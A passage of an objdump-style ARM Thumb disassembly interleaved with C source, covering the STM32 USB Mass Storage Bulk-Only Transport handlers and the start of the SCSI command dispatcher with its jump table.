 8009756:	d005      	beq.n	8009764 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 8009758:	68fb      	ldr	r3, [r7, #12]
 800975a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800975e:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009760:	2b10      	cmp	r3, #16
 8009762:	d90f      	bls.n	8009784 <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009764:	68fb      	ldr	r3, [r7, #12]
 8009766:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800976a:	7f59      	ldrb	r1, [r3, #29]
 800976c:	2320      	movs	r3, #32
 800976e:	2205      	movs	r2, #5
 8009770:	6878      	ldr	r0, [r7, #4]
 8009772:	f000 fe7b 	bl	800a46c <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009776:	68fb      	ldr	r3, [r7, #12]
 8009778:	2202      	movs	r2, #2
 800977a:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 800977c:	6878      	ldr	r0, [r7, #4]
 800977e:	f000 f8cb 	bl	8009918 <MSC_BOT_Abort>
 8009782:	e045      	b.n	8009810 <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009784:	68fb      	ldr	r3, [r7, #12]
 8009786:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800978a:	7f59      	ldrb	r1, [r3, #29]
 800978c:	68fb      	ldr	r3, [r7, #12]
 800978e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009792:	331f      	adds	r3, #31
 8009794:	461a      	mov	r2, r3
 8009796:	6878      	ldr	r0, [r7, #4]
 8009798:	f000 f93c 	bl	8009a14 <SCSI_ProcessCmd>
 800979c:	4603      	mov	r3, r0
 800979e:	2b00      	cmp	r3, #0
 80097a0:	da0c      	bge.n	80097bc <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 80097a2:	68fb      	ldr	r3, [r7, #12]
 80097a4:	7a1b      	ldrb	r3, [r3, #8]
 80097a6:	2b05      	cmp	r3, #5
 80097a8:	d104      	bne.n	80097b4 <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80097aa:	2101      	movs	r1, #1
 80097ac:	6878      	ldr	r0, [r7, #4]
 80097ae:	f000 f873 	bl	8009898 <MSC_BOT_SendCSW>
 80097b2:	e02d      	b.n	8009810 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 80097b4:	6878      	ldr	r0, [r7, #4]
 80097b6:	f000 f8af 	bl	8009918 <MSC_BOT_Abort>
 80097ba:	e029      	b.n	8009810 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 80097bc:	68fb      	ldr	r3, [r7, #12]
 80097be:	7a1b      	ldrb	r3, [r3, #8]
 80097c0:	2b02      	cmp	r3, #2
 80097c2:	d024      	beq.n	800980e <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 80097c4:	68fb      	ldr	r3, [r7, #12]
 80097c6:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 80097c8:	2b01      	cmp	r3, #1
 80097ca:	d020      	beq.n	800980e <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 80097cc:	68fb      	ldr	r3, [r7, #12]
 80097ce:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 80097d0:	2b03      	cmp	r3, #3
 80097d2:	d01c      	beq.n	800980e <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 80097d4:	68fb      	ldr	r3, [r7, #12]
 80097d6:	68db      	ldr	r3, [r3, #12]
 80097d8:	2b00      	cmp	r3, #0
 80097da:	d009      	beq.n	80097f0 <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 80097dc:	68fb      	ldr	r3, [r7, #12]
 80097de:	f103 0110 	add.w	r1, r3, #16
 80097e2:	68fb      	ldr	r3, [r7, #12]
 80097e4:	68db      	ldr	r3, [r3, #12]
 80097e6:	461a      	mov	r2, r3
 80097e8:	6878      	ldr	r0, [r7, #4]
 80097ea:	f000 f819 	bl	8009820 <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 80097ee:	e00f      	b.n	8009810 <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 80097f0:	68fb      	ldr	r3, [r7, #12]
 80097f2:	68db      	ldr	r3, [r3, #12]
 80097f4:	2b00      	cmp	r3, #0
 80097f6:	d104      	bne.n	8009802 <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 80097f8:	2100      	movs	r1, #0
 80097fa:	6878      	ldr	r0, [r7, #4]
 80097fc:	f000 f84c 	bl	8009898 <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 8009800:	e006      	b.n	8009810 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 8009802:	6878      	ldr	r0, [r7, #4]
 8009804:	f000 f888 	bl	8009918 <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 8009808:	e002      	b.n	8009810 <MSC_BOT_CBW_Decode+0x130>
    return;
 800980a:	bf00      	nop
 800980c:	e000      	b.n	8009810 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 800980e:	bf00      	nop
    }
  }
}
 8009810:	3710      	adds	r7, #16
 8009812:	46bd      	mov	sp, r7
 8009814:	bd80      	pop	{r7, pc}
 8009816:	bf00      	nop
 8009818:	2000010b 	.word	0x2000010b
 800981c:	43425355 	.word	0x43425355

08009820 <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 8009820:	b580      	push	{r7, lr}
 8009822:	b086      	sub	sp, #24
 8009824:	af00      	add	r7, sp, #0
 8009826:	60f8      	str	r0, [r7, #12]
 8009828:	60b9      	str	r1, [r7, #8]
 800982a:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800982c:	68fb      	ldr	r3, [r7, #12]
 800982e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009832:	68fb      	ldr	r3, [r7, #12]
 8009834:	32b0      	adds	r2, #176	; 0xb0
 8009836:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800983a:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 800983c:	697b      	ldr	r3, [r7, #20]
 800983e:	2b00      	cmp	r3, #0
 8009840:	d023      	beq.n	800988a <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 8009842:	697b      	ldr	r3, [r7, #20]
 8009844:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009848:	699b      	ldr	r3, [r3, #24]
 800984a:	687a      	ldr	r2, [r7, #4]
 800984c:	4293      	cmp	r3, r2
 800984e:	bf28      	it	cs
 8009850:	4613      	movcs	r3, r2
 8009852:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 8009854:	697b      	ldr	r3, [r7, #20]
 8009856:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800985a:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800985c:	687b      	ldr	r3, [r7, #4]
 800985e:	1ad3      	subs	r3, r2, r3
 8009860:	697a      	ldr	r2, [r7, #20]
 8009862:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 8009866:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 8009868:	697b      	ldr	r3, [r7, #20]
 800986a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800986e:	2200      	movs	r2, #0
 8009870:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 8009874:	697b      	ldr	r3, [r7, #20]
 8009876:	2204      	movs	r2, #4
 8009878:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 800987a:	4b06      	ldr	r3, [pc, #24]	; (8009894 <MSC_BOT_SendData+0x74>)
 800987c:	7819      	ldrb	r1, [r3, #0]
 800987e:	693b      	ldr	r3, [r7, #16]
 8009880:	68ba      	ldr	r2, [r7, #8]
 8009882:	68f8      	ldr	r0, [r7, #12]
 8009884:	f003 fbe4 	bl	800d050 <USBD_LL_Transmit>
 8009888:	e000      	b.n	800988c <MSC_BOT_SendData+0x6c>
    return;
 800988a:	bf00      	nop
}
 800988c:	3718      	adds	r7, #24
 800988e:	46bd      	mov	sp, r7
 8009890:	bd80      	pop	{r7, pc}
 8009892:	bf00      	nop
 8009894:	2000010a 	.word	0x2000010a

08009898 <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 8009898:	b580      	push	{r7, lr}
 800989a:	b084      	sub	sp, #16
 800989c:	af00      	add	r7, sp, #0
 800989e:	6078      	str	r0, [r7, #4]
 80098a0:	460b      	mov	r3, r1
 80098a2:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80098a4:	687b      	ldr	r3, [r7, #4]
 80098a6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80098aa:	687b      	ldr	r3, [r7, #4]
 80098ac:	32b0      	adds	r2, #176	; 0xb0
 80098ae:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80098b2:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80098b4:	68fb      	ldr	r3, [r7, #12]
 80098b6:	2b00      	cmp	r3, #0
 80098b8:	d024      	beq.n	8009904 <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 80098ba:	68fb      	ldr	r3, [r7, #12]
 80098bc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80098c0:	461a      	mov	r2, r3
 80098c2:	4b12      	ldr	r3, [pc, #72]	; (800990c <MSC_BOT_SendCSW+0x74>)
 80098c4:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 80098c6:	68fb      	ldr	r3, [r7, #12]
 80098c8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80098cc:	461a      	mov	r2, r3
 80098ce:	78fb      	ldrb	r3, [r7, #3]
 80098d0:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 80098d4:	68fb      	ldr	r3, [r7, #12]
 80098d6:	2200      	movs	r2, #0
 80098d8:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 80098da:	4b0d      	ldr	r3, [pc, #52]	; (8009910 <MSC_BOT_SendCSW+0x78>)
 80098dc:	7819      	ldrb	r1, [r3, #0]
 80098de:	68fb      	ldr	r3, [r7, #12]
 80098e0:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 80098e4:	3210      	adds	r2, #16
 80098e6:	230d      	movs	r3, #13
 80098e8:	6878      	ldr	r0, [r7, #4]
 80098ea:	f003 fbb1 	bl	800d050 <USBD_LL_Transmit>
                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80098ee:	4b09      	ldr	r3, [pc, #36]	; (8009914 <MSC_BOT_SendCSW+0x7c>)
 80098f0:	7819      	ldrb	r1, [r3, #0]
 80098f2:	68fb      	ldr	r3, [r7, #12]
 80098f4:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80098f8:	3210      	adds	r2, #16
 80098fa:	231f      	movs	r3, #31
 80098fc:	6878      	ldr	r0, [r7, #4]
 80098fe:	f003 fbdf 	bl	800d0c0 <USBD_LL_PrepareReceive>
 8009902:	e000      	b.n	8009906 <MSC_BOT_SendCSW+0x6e>
    return;
 8009904:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009906:	3710      	adds	r7, #16
 8009908:	46bd      	mov	sp, r7
 800990a:	bd80      	pop	{r7, pc}
 800990c:	53425355 	.word	0x53425355
 8009910:	2000010a 	.word	0x2000010a
 8009914:	2000010b 	.word	0x2000010b

08009918 <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 8009918:	b580      	push	{r7, lr}
 800991a:	b084      	sub	sp, #16
 800991c:	af00      	add	r7, sp, #0
 800991e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009920:	687b      	ldr	r3, [r7, #4]
 8009922:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009926:	687b      	ldr	r3, [r7, #4]
 8009928:	32b0      	adds	r2, #176	; 0xb0
 800992a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800992e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009930:	68fb      	ldr	r3, [r7, #12]
 8009932:	2b00      	cmp	r3, #0
 8009934:	d02c      	beq.n	8009990 <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 8009936:	68fb      	ldr	r3, [r7, #12]
 8009938:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800993c:	7f1b      	ldrb	r3, [r3, #28]
 800993e:	2b00      	cmp	r3, #0
 8009940:	d10f      	bne.n	8009962 <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 8009942:	68fb      	ldr	r3, [r7, #12]
 8009944:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009948:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 800994a:	2b00      	cmp	r3, #0
 800994c:	d009      	beq.n	8009962 <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 800994e:	68fb      	ldr	r3, [r7, #12]
 8009950:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 8009952:	2b00      	cmp	r3, #0
 8009954:	d105      	bne.n	8009962 <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 8009956:	4b10      	ldr	r3, [pc, #64]	; (8009998 <MSC_BOT_Abort+0x80>)
 8009958:	781b      	ldrb	r3, [r3, #0]
 800995a:	4619      	mov	r1, r3
 800995c:	6878      	ldr	r0, [r7, #4]
 800995e:	f003 faa7 	bl	800ceb0 <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009962:	4b0e      	ldr	r3, [pc, #56]	; (800999c <MSC_BOT_Abort+0x84>)
 8009964:	781b      	ldrb	r3, [r3, #0]
 8009966:	4619      	mov	r1, r3
 8009968:	6878      	ldr	r0, [r7, #4]
 800996a:	f003 faa1 	bl	800ceb0 <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 800996e:	68fb      	ldr	r3, [r7, #12]
 8009970:	7a5b      	ldrb	r3, [r3, #9]
 8009972:	2b02      	cmp	r3, #2
 8009974:	d10d      	bne.n	8009992 <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009976:	4b09      	ldr	r3, [pc, #36]	; (800999c <MSC_BOT_Abort+0x84>)
 8009978:	781b      	ldrb	r3, [r3, #0]
 800997a:	4619      	mov	r1, r3
 800997c:	6878      	ldr	r0, [r7, #4]
 800997e:	f003 fa97 	bl	800ceb0 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 8009982:	4b05      	ldr	r3, [pc, #20]	; (8009998 <MSC_BOT_Abort+0x80>)
 8009984:	781b      	ldrb	r3, [r3, #0]
 8009986:	4619      	mov	r1, r3
 8009988:	6878      	ldr	r0, [r7, #4]
 800998a:	f003 fa91 	bl	800ceb0 <USBD_LL_StallEP>
 800998e:	e000      	b.n	8009992 <MSC_BOT_Abort+0x7a>
    return;
 8009990:	bf00      	nop
  }
}
 8009992:	3710      	adds	r7, #16
 8009994:	46bd      	mov	sp, r7
 8009996:	bd80      	pop	{r7, pc}
 8009998:	2000010b 	.word	0x2000010b
 800999c:	2000010a 	.word	0x2000010a

080099a0 <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80099a0:	b580      	push	{r7, lr}
 80099a2:	b084      	sub	sp, #16
 80099a4:	af00      	add	r7, sp, #0
 80099a6:	6078      	str	r0, [r7, #4]
 80099a8:	460b      	mov	r3, r1
 80099aa:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80099ac:	687b      	ldr	r3, [r7, #4]
 80099ae:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80099b2:	687b      	ldr	r3, [r7, #4]
 80099b4:	32b0      	adds	r2, #176	; 0xb0
 80099b6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80099ba:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80099bc:	68fb      	ldr	r3, [r7, #12]
 80099be:	2b00      	cmp	r3, #0
 80099c0:	d01d      	beq.n	80099fe <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 80099c2:	68fb      	ldr	r3, [r7, #12]
 80099c4:	7a5b      	ldrb	r3, [r3, #9]
 80099c6:	2b02      	cmp	r3, #2
 80099c8:	d10c      	bne.n	80099e4 <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80099ca:	4b10      	ldr	r3, [pc, #64]	; (8009a0c <MSC_BOT_CplClrFeature+0x6c>)
 80099cc:	781b      	ldrb	r3, [r3, #0]
 80099ce:	4619      	mov	r1, r3
 80099d0:	6878      	ldr	r0, [r7, #4]
 80099d2:	f003 fa6d 	bl	800ceb0 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 80099d6:	4b0e      	ldr	r3, [pc, #56]	; (8009a10 <MSC_BOT_CplClrFeature+0x70>)
 80099d8:	781b      	ldrb	r3, [r3, #0]
 80099da:	4619      	mov	r1, r3
 80099dc:	6878      	ldr	r0, [r7, #4]
 80099de:	f003 fa67 	bl	800ceb0 <USBD_LL_StallEP>
 80099e2:	e00f      	b.n	8009a04 <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 80099e4:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80099e8:	2b00      	cmp	r3, #0
 80099ea:	da0a      	bge.n	8009a02 <MSC_BOT_CplClrFeature+0x62>
 80099ec:	68fb      	ldr	r3, [r7, #12]
 80099ee:	7a5b      	ldrb	r3, [r3, #9]
 80099f0:	2b01      	cmp	r3, #1
 80099f2:	d006      	beq.n	8009a02 <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80099f4:	2101      	movs	r1, #1
 80099f6:	6878      	ldr	r0, [r7, #4]
 80099f8:	f7ff ff4e 	bl	8009898 <MSC_BOT_SendCSW>
 80099fc:	e002      	b.n	8009a04 <MSC_BOT_CplClrFeature+0x64>
    return;
 80099fe:	bf00      	nop
 8009a00:	e000      	b.n	8009a04 <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 8009a02:	bf00      	nop
  }
}
 8009a04:	3710      	adds	r7, #16
 8009a06:	46bd      	mov	sp, r7
 8009a08:	bd80      	pop	{r7, pc}
 8009a0a:	bf00      	nop
 8009a0c:	2000010a 	.word	0x2000010a
 8009a10:	2000010b 	.word	0x2000010b

08009a14 <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 8009a14:	b580      	push	{r7, lr}
 8009a16:	b086      	sub	sp, #24
 8009a18:	af00      	add	r7, sp, #0
 8009a1a:	60f8      	str	r0, [r7, #12]
 8009a1c:	460b      	mov	r3, r1
 8009a1e:	607a      	str	r2, [r7, #4]
 8009a20:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009a22:	68fb      	ldr	r3, [r7, #12]
 8009a24:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009a28:	68fb      	ldr	r3, [r7, #12]
 8009a2a:	32b0      	adds	r2, #176	; 0xb0
 8009a2c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009a30:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 8009a32:	693b      	ldr	r3, [r7, #16]
 8009a34:	2b00      	cmp	r3, #0
 8009a36:	d102      	bne.n	8009a3e <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 8009a38:	f04f 33ff 	mov.w	r3, #4294967295
 8009a3c:	e168      	b.n	8009d10 <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 8009a3e:	687b      	ldr	r3, [r7, #4]
 8009a40:	781b      	ldrb	r3, [r3, #0]
 8009a42:	2baa      	cmp	r3, #170	; 0xaa
 8009a44:	f000 8144 	beq.w	8009cd0 <SCSI_ProcessCmd+0x2bc>
 8009a48:	2baa      	cmp	r3, #170	; 0xaa
 8009a4a:	f300 8153 	bgt.w	8009cf4 <SCSI_ProcessCmd+0x2e0>
 8009a4e:	2ba8      	cmp	r3, #168	; 0xa8
 8009a50:	f000 812c 	beq.w	8009cac <SCSI_ProcessCmd+0x298>
 8009a54:	2ba8      	cmp	r3, #168	; 0xa8
 8009a56:	f300 814d 	bgt.w	8009cf4 <SCSI_ProcessCmd+0x2e0>
 8009a5a:	2b5a      	cmp	r3, #90	; 0x5a
 8009a5c:	f300 80c0 	bgt.w	8009be0 <SCSI_ProcessCmd+0x1cc>
 8009a60:	2b00      	cmp	r3, #0
 8009a62:	f2c0 8147 	blt.w	8009cf4 <SCSI_ProcessCmd+0x2e0>
 8009a66:	2b5a      	cmp	r3, #90	; 0x5a
 8009a68:	f200 8144 	bhi.w	8009cf4 <SCSI_ProcessCmd+0x2e0>
 8009a6c:	a201      	add	r2, pc, #4	; (adr r2, 8009a74 <SCSI_ProcessCmd+0x60>)
 8009a6e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8009a72:	bf00      	nop
 8009a74:	08009be7 	.word	0x08009be7
 8009a78:	08009cf5 	.word	0x08009cf5
 8009a7c:	08009cf5 	.word	0x08009cf5
 8009a80:	08009bf9 	.word	0x08009bf9
 8009a84:	08009cf5 	.word	0x08009cf5
 8009a88:	08009cf5 	.word	0x08009cf5
 8009a8c:	08009cf5 	.word	0x08009cf5
 8009a90:	08009cf5 	.word	0x08009cf5
 8009a94:	08009cf5 	.word	0x08009cf5
 8009a98:	08009cf5 	.word	0x08009cf5
 8009a9c:	08009cf5 	.word	0x08009cf5
 8009aa0:	08009cf5 	.word	0x08009cf5
 8009aa4:	08009cf5 	.word	0x08009cf5
 8009aa8:	08009cf5 	.word	0x08009cf5
 8009aac:	08009cf5 	.word	0x08009cf5
 8009ab0:	08009cf5 	.word	0x08009cf5
 8009ab4:	08009cf5 	.word	0x08009cf5
 8009ab8:	08009cf5 	.word	0x08009cf5
 8009abc:	08009c0b 	.word	0x08009c0b
 8009ac0:	08009cf5 	.word	0x08009cf5
 8009ac4:	08009cf5 	.word	0x08009cf5
 8009ac8:	08009cf5 	.word	0x08009cf5
 8009acc:	08009cf5 	.word	0x08009cf5
 8009ad0:	08009cf5 	.word	0x08009cf5
 8009ad4:	08009cf5 	.word	0x08009cf5
 8009ad8:	08009cf5 	.word	0x08009cf5
 8009adc:	08009c41 	.word	0x08009c41
 8009ae0:	08009c1d 	.word	0x08009c1d
 8009ae4:	08009cf5 	.word	0x08009cf5
 8009ae8:	08009cf5 	.word	0x08009cf5
 8009aec:	08009c2f 	.word	0x08009c2f
 8009af0:	08009cf5 	.word	0x08009cf5
 8009af4:	08009cf5 	.word	0x08009cf5
 8009af8:	08009cf5 	.word	0x08009cf5
 8009afc:	08009cf5 	.word	0x08009cf5
 8009b00:	08009c65 	.word	0x08009c65
 8009b04:	08009cf5 	.word	0x08009cf5
 8009b08:	08009c77 	.word	0x08009c77
 8009b0c:	08009cf5 	.word	0x08009cf5
 8009b10:	08009cf5 	.word	0x08009cf5
 8009b14:	08009c9b 	.word	0x08009c9b
 8009b18:	08009cf5 	.word	0x08009cf5
 8009b1c:	08009cbf 	.word	0x08009cbf
 8009b20:	08009cf5 	.word	0x08009cf5
 8009b24:	08009cf5 	.word	0x08009cf5
 8009b28:	08009cf5 	.word	0x08009cf5
 8009b2c:	08009cf5 	.word	0x08009cf5
 8009b30:	08009ce3 	.word	0x08009ce3
 8009b34:	08009cf5 	.word	0x08009cf5
 8009b38:	08009cf5 	.word	0x08009cf5
 8009b3c:	08009cf5 	.word	0x08009cf5
 8009b40:	08009cf5 	.word	0x08009cf5
 8009b44:	08009cf5 	.word	0x08009cf5
 8009b48:	08009cf5 	.word	0x08009cf5
 8009b4c:	08009cf5 	.word	0x08009cf5
 8009b50:	08009cf5 	.word	0x08009cf5
 8009b54:	08009cf5 	.word	0x08009cf5
 8009b58:	08009cf5 	.word	0x08009cf5
 8009b5c:	08009cf5 	.word	0x08009cf5
 8009b60:	08009cf5 	.word	0x08009cf5
 8009b64:	08009cf5 	.word	0x08009cf5
 8009b68:	08009cf5 	.word	0x08009cf5
 8009b6c:	08009cf5 	.word	0x08009cf5
 8009b70:	08009cf5 	.word	0x08009cf5
 8009b74:	08009cf5 	.word	0x08009cf5
 8009b78:	08009cf5 	.word	0x08009cf5
 8009b7c:	08009cf5 	.word	0x08009cf5
 8009b80:	08009cf5 	.word	0x08009cf5
 8009b84:	08009cf5 	.word	0x08009cf5
 8009b88:	08009cf5 	.word	0x08009cf5
 8009b8c:	08009cf5 	.word	0x08009cf5
 8009b90:	08009cf5 	.word	0x08009cf5
 8009b94:	08009cf5 	.word	0x08009cf5
 8009b98:	08009cf5 	.word	0x08009cf5
 8009b9c:	08009cf5 	.word	0x08009cf5
 8009ba0:	08009cf5 	.word	0x08009cf5
 8009ba4:	08009cf5 	.word	0x08009cf5
 8009ba8:	08009cf5 	.word	0x08009cf5
